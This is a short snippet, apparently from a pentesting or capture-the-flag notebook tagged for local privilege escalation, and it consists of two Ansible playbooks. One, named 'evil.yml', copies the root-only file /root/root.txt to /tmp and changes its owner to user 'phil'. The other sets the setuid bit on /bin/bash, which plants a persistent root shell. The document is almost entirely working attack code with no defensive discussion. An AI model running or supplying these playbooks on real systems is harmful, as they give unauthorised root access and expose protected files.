```
# ansible-playbook evil.yml
- name: Evil playbook
  hosts: all
  gather_facts: true
  tasks:
    - name: execute
      shell: "cat /root/root.txt > /tmp/secret && chown phil:phil /tmp/secret"
      async: 10
      poll: 0
```


#lpe #ansible
```
- hosts: localhost
  tasks:
    - name: Test
      command: chmod u+s /bin/bash
      become: true
```